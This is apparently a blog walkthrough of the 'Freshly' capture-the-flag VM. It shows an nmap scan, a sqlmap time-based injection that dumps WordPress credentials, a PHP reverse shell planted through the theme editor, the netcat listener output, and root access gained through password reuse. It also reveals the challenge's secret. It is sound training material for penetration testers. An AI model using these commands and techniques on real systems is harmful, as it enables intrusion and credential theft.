---
layout: blog_item
title: "Freshly Walkthrough"
date: "2015-06-14"
author: Arr0way
description: 'Freshly - Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification.

### Port Scanning

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 10.0.1.109

{% endhighlight %}


### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>64 Apache httpd 2.4.7 ((Ubuntu))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 443</code></p></pc>
           </td>
           <td>
               <pc><p>HTTPS</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 8080</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd</p></pc>
           </td>
        </tr>
        </tbody>

</table>
</div>

### HTTP Enumeration

Enumeration of port 80, discovered <code>login.php</code>:

![dirbuster](/img/blog/freshly/dirbuster.png)

![login form sqli](/img/blog/freshly/login.png)

## SQL Injection  

The discovered form was vulnerable to a time-based SQL injection, SQLMap was used to expose the following databases:


{% highlight bash %}

available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

{% endhighlight %}

SQLMap was used to dump the **wordpress8080** database:


{% highlight bash %}

sqlmap -o -u "http://10.0.1.109/login.php" --forms -D wordpress8080 -T users --risk 1 --dbms=mysql --dump

{% endhighlight %}

Discovered credentials:

{% highlight bash %}

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+

{% endhighlight %}

## Wordpress - Reverse PHP Shell

Wordpress was accessible on port <code>443</code> and port <code>8080</code>. Authentication was successful using the discovered credentials and a PHP reverse shell was introduced to the sites source code via the wordpress theme editor.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><b>admin</b></p></pc>
           </td>
           <td>
               <pc><p><code>SuperSecretPassword</code></p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

![wordpress reverse php shell](/img/blog/freshly/wordpress-php-shell.png)

A reverse shell successfully connected back:

{% highlight bash %}

[root:~]# nc -n -v -l -p 443           
listening on [any] 443 ...
connect to [10.0.1.110] from (UNKNOWN) [10.0.1.109] 37912
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 13:26:49 up 46 min,  0 users,  load average: 0.00, 0.01, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$

{% endhighlight %}


## Privilege Escalation

Account credential reuse from the Wordpress admin password <code>SuperSecretPassword</code> allowed <code>su -</code> to escalate privileges to root.

{% highlight bash %}

$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@Freshly:/$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

daemon@Freshly:/$ su -
su -
Password: SuperSecretPassword

root@Freshly:~# id
id
uid=0(root) gid=0(root) groups=0(root)

{% endhighlight %}

## Post Exploitation Enumeration  

The file <code>/etc/passwd</code> contained the text:

{% highlight bash %}

root@Freshly:/# tail -n 5 /etc/passwd
tail -n 5 /etc/passwd
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"

{% endhighlight %}

Additionally the file <code>/etc/shadow</code> had incorrect permissions allowing a non privileged user read access, allowing for offline password cracking using Hashcat / JTR.

Thanks for the VM :)
